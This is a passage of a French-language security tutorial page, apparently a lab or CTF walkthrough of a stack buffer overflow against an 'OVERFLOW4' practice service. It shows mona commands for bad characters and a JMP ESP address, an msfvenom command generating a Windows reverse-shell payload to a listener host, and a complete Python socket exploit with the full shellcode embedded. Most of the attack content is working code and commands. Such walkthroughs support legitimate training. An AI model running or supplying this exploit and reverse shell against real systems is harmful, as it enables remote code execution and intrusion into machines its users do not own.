+  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;{:02x}&#34;</span><span style="color:#f92672">.</span>format(x) <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> listRem:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;{:02x}&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#66d9ef">print</span>()
+</code></pre></div><p>Puis avec mona</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">bytearray</span> <span style="color:#a6e22e">-b</span> <span style="color:#a6e22e">&#34;\x00\xa9\xcd\xd4&#34;</span>
+</code></pre></div><p>Jusqu&rsquo;à avoir ce résultat</p>
+
+
+
+  <img src="/img/bo/mona_result.png" alt="result of mona" class="imageformat"/>
+
+<h1 id="recherche-de-jump">Recherche de JUMP</h1>
+<p>Il faut maintenant trouver un jump sans mauvais caractères.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">jmp</span> <span style="color:#a6e22e">-r</span> <span style="color:#a6e22e">esp</span> <span style="color:#a6e22e">-cpb</span> <span style="color:#a6e22e">&#34;\x00\xa9\xcd\xd4&#34;</span>
+</code></pre></div><p>Il faudra ensuite relever l&rsquo;adresse et s&rsquo;adapter à l&rsquo;architecture little ou big endian. Dans notre cas c&rsquo;est le petit.</p>
+
+
+
+  <img src="/img/bo/jmp.png" alt="search jump instruction" class="imageformat"/>
+
+<p>On a plus qu&rsquo;à placer l&rsquo;adresse du jump dans notre script python dans la variable rtn.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+bad <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span>
+offset <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2026</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xaf\x11\x50\x62</span><span style="color:#e6db74">&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> bad <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+
+</code></pre></div><p>On en profite aussi pour ajouter des \x90 (NOP) qui permettent de laisser un peu d&rsquo;espace mémoire pour que notre charge utile, que l&rsquo;on construira juste après, puisse se décompresser.</p>
+<h1 id="création-du-payload">Création du payload</h1>
+<p>Pour générer le payload on utilise msfvenom et on prend soin de retirer les mauvais carctères.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.9.1.86 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9876</span> EXITFUNC<span style="color:#f92672">=</span>thread -b  <span style="color:#e6db74">&#34;\x00\xa9\xcd\xd4&#34;</span> -f c
+</code></pre></div><p>On ajoute ensuite le payload dans notre code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3                        </span>
+                                              
+<span style="color:#f92672">import</span> socket                                 
+                       
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>                                   
+bad <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>           
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span>
+offset <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2026</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xaf\x11\x50\x62</span><span style="color:#e6db74">&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
+payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbb\x93\xe7\x70\x17\xdb\xd9\xd9\x74\x24\xf4\x58\x29\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x83\xc0\x04\x31\x58\x0e\x03\xcb\xe9\x92\xe2\x17\x1d\xd0</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d\xe7\xde\xb5\x84\x02\xef\xf5\xf3\x47\x40\xc6\x70\x05\x6d</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xad\xd5\xbd\xe6\xc3\xf1\xb2\x4f\x69\x24\xfd\x50\xc2\x14\x9c</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x19\x49\x7e\xea\xd1\x9c\x7f\x2b\x0f\x6c\x2d\xe4\x5b\xc3</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\x81\x16\xd8\x6a\xd9\xb7\x58\x8f\xaa\xb6\x49\x1e\xa0\xe0</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x49\xa1\x65\x99\xc3\xb9\x6a\xa4\x9a\x32\x58\x52\x1d\x92\x90</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9b\xb2\xdb\x1c\x6e\xca\x1c\x9a\x91\xb9\x54\xd8\x2c\xba\xa3</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\xea\x4f\x37\x04\x78\xf7\x93\xb4\xad\x6e\x50\xba\x1a\xe4</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\xdf\x9d\x29\x35\xdb\x16\xcc\x99\x6d\x6c\xeb\x3d\x35\x36</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x92\x64\x93\x99\xab\x76\x7c\x45\x0e\xfd\x91\x92\x23\x5c\xfe</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x57\x0e\x5e\xfe\xff\x19\x2d\xcc\xa0\xb1\xb9\x7c\x28\x1c\x3e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\x03\xd8\xd0\x7d\xac\x19\xf9\xb9\xf8\x49\x91\x68\x81\x01</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61\x94\x54\x85\x31\x3a\x07\x66\xe1\xfa\xf7\x0e\xeb\xf4\x28</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2e\x14\xdf\x40\xc5\xef\x88\x64\x13\xee\x1e\x11\x21\xf0\xb8</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xac\x16\xae\x65\xf9\x81\x47\x1f\xa0\x59\xf9\xe0\x7e\x24</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x6a\x8d\xd9\xf4\x9b\xf8\xc9\x61\x6c\xb7\xb3\x24\x73\x6d</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xab\xe6\xea\x1b\xa5\x1a\xa5\x4c\xe2\xed\xbc\x18\x1e\x57</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x3e\xe3\x01\x50\xfa\x38\xf2\x5f\x03\xcc\x4e\x44\x13\x08</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4e\xc0\x47\xc4\x19\x9e\x31\xa2\xf3\x50\xeb\x7c\xaf\x3a\x7b</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf8\x83\xfc\xfd\x05\xce\x8a\xe1\xb4\xa7\xca\x1e\x78\x20\xdb</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\x64\xd0\x24\xb2\x2c\xf0\xc6\x16\x59\x99\x5e\xf3\xe0\xc4</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x2e\x26\xf1\xe2\xda\xd7\x06\xfa\xaf\xd2\x43\xbc\x5c\xaf</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x29\x62\x1c\xdc\x7b</span><span style="color:#e6db74">&#34;</span>)
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> bad <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+</code></pre></div><h1 id="exploit-enfin">Exploit (enfin)</h1>
+<p>Il suffit de lancer le script avec votre port en écoute et le tour est joué !</p>
+
+
+
+  <img src="/img/bo/buffer_exploit.png" alt="buffer exploitation" class="imageformat"/>
+
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/cuisine/zonetransfert/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">DNS - Transfert de Zone </span>
+    </a>
+    
+    
+    <a href="/cuisine/ad/" class="navigation-next">
+      <span class="navigation-tittle">Active directory </span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
